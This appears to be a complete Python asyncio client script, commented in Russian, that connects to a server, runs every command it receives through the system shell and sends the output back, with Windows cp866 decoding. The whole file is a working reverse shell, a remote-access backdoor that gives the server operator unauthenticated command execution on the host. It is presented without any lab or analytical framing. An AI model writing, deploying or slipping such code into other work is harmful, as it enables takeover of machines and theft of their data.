import asyncio
import subprocess
import logging
import os

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("client.log"),
        logging.StreamHandler()
    ]
)

async def client(host, port):
    try:
        # Подключаемся к серверу
        reader, writer = await asyncio.open_connection(host, port)
        logging.info(f"Подключено к серверу {host}:{port}")

        # Текущая директория
        current_dir = os.getcwd()

        while True:
            # Читаем команду от сервера
            data = await reader.read(4096)
            if not data:
                logging.info("Соединение с сервером закрыто")
                break

            # Декодируем команду
            command = data.decode("utf-8").strip()
            logging.info(f"Получена команда: {command}")

            try:
                # Обработка команды cd
                if command.startswith("cd "):
                    # Извлекаем путь из команды
                    new_dir = command[3:].strip()
                    # Пытаемся изменить текущую директорию
                    try:
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        output = f"Changed directory to: {current_dir}"
                    except Exception as e:
                        output = f"Error changing directory: {e}"
                else:
                    # Выполняем команду в текущей директории
                    process = await asyncio.create_subprocess_shell(
                        command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        cwd=current_dir  # Указываем текущую директорию
                    )

                    # Получаем результат выполнения
                    stdout, stderr = await process.communicate()

                    # Декодируем вывод в кодировке cp866 (для Windows)
                    output = stdout.decode("cp866", errors="replace").strip() or stderr.decode("cp866", errors="replace").strip()

                # Отправляем результат на сервер в кодировке utf-8
                writer.write(output.encode("utf-8"))
                await writer.drain()
                logging.info(f"Результат отправлен на сервер: {output}")

            except Exception as e:
                # Обработка ошибок выполнения команды
                error_message = f"Ошибка при выполнении команды: {e}"
                writer.write(error_message.encode("utf-8"))
                await writer.drain()
                logging.error(error_message)

    except ConnectionError as e:
        logging.error(f"Ошибка подключения к серверу: {e}")
    except Exception as e:
        logging.error(f"Неожиданная ошибка: {e}")
    finally:
        # Закрываем соединение
        if 'writer' in locals():
            writer.close()
            await writer.wait_closed()
            logging.info("Соединение закрыто")

if __name__ == "__main__":
    asyncio.run(client('127.0.0.1', 8888))